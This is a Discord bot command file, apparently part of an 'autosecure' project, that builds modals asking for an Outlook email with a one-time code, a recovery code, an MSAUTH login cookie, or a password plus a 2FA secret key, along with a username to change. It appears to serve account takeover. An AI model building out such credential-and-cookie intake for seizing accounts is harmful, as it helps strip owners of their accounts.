const { ApplicationCommandOptionType, TextInputStyle } = require("discord.js");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");
const listConfiguration = require('../../../autosecure/utils/settings/listConfiguration');

module.exports = {
  name: "secure",
  description: "Secure an account",
  options: [
    {
      name: "type",
      description: "Type of Securing",
      type: ApplicationCommandOptionType.String,
      required: true,
      choices: [
        {
          name: "OTP",
          value: "otp"
        },
        {
          name: "Recovery Code",
          value: "rec"
        },
        {
          name: "MSAUTH",
          value: "msauth"
        },
        {
          name: "Password + Secret Key",
          value: "zyger" 
        },
        {
          name: "Secure Configuration",
          value: "config" 
        }
      ]
    }
  ],
  enabled: true,
  userOnly: true,
  callback: async (client, interaction) => {
    let option = interaction.options.getString("type");

    if (option === "otp") {
      return interaction.showModal(modalBuilder(`otpsecure`, `Type Your Account Information`,
        [
          {
            setCustomId: 'email',
            setMaxLength: 200,
            setMinLength: 1,
            setRequired: true,
            setLabel: "Email",
            setPlaceholder: "Ex: test@outlook.com",
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: 'otp',
            setMaxLength: 7,
            setMinLength: 6,
            setRequired: true,
            setLabel: "OTP",
            setPlaceholder: "Ex: 312849",
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: 'username',
            setMaxLength: 16,
            setMinLength: 3,
            setRequired: false,
            setLabel: "Change username",
            setPlaceholder: "3-16 characters",
            setStyle: TextInputStyle.Short
          }
        ]
      ));
    } else if (option === "rec") {
      return interaction.showModal(modalBuilder(`recsecure`, `Type Your Account Information`,
        [
          {
            setCustomId: 'email',
            setMaxLength: 200,
            setMinLength: 1,
            setRequired: true,
            setLabel: "Email",
            setPlaceholder: "Ex: test@outlook.com",
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: 'auth',
            setMaxLength: 40,
            setMinLength: 1,
            setRequired: true,
            setLabel: "Recovery Code",
            setPlaceholder: "Ex: 5LR2M-JF4XZ-EDBWS-VMLQD-T34CW",
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: 'username',
            setMaxLength: 16,
            setMinLength: 3,
            setRequired: false,
            setLabel: "Change username",
            setPlaceholder: "3-16 characters",
            setStyle: TextInputStyle.Short
          }
        ]
      ));
    } else if (option === "msauth") {
      console.log(`authsecure!`)
      return interaction.showModal(modalBuilder(`authsecure`, `Enter MSAUTH`,
        [
          {
            setCustomId: 'msauth',
            setMaxLength: 500,
            setMinLength: 1,
            setRequired: true,
            setLabel: "MSAUTH",
            setPlaceholder: "Enter the login cookie here",
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: 'username',
            setMaxLength: 16,
            setMinLength: 3,
            setRequired: false,
            setLabel: "Change username",
            setPlaceholder: "3-16 characters",
            setStyle: TextInputStyle.Short
          }
        ]
      ));
    } else if (option === "zyger") {
      return interaction.showModal(modalBuilder(`zygersecure`, `Enter Your Details`,
        [
          {
            setCustomId: 'email',
            setMaxLength: 200,
            setMinLength: 1,
            setRequired: true,
            setLabel: "Email",
            setPlaceholder: "Ex: test@outlook.com",
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: 'pw',
            setMaxLength: 40,
            setMinLength: 1,
            setRequired: true,
            setLabel: "Password",
            setPlaceholder: "Ex: ILoveOldward123!",
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: 'secretkey',
            setMaxLength: 200,
            setMinLength: 1,
            setRequired: true,
            setLabel: "Secret Key",
            setPlaceholder: "Ex: 5cbw szz5 v5cu u4n3",
            setStyle: TextInputStyle.Short
          },
          {
            setCustomId: 'username',
            setMaxLength: 16,
            setMinLength: 3,
            setRequired: false,
            setLabel: "Change username",
            setPlaceholder: "3-16 characters",
            setStyle: TextInputStyle.Short
          }
        ]
      ));
    } else if (option === "config") {
      return interaction.reply(await listConfiguration(interaction.user.id))
    }
  }
};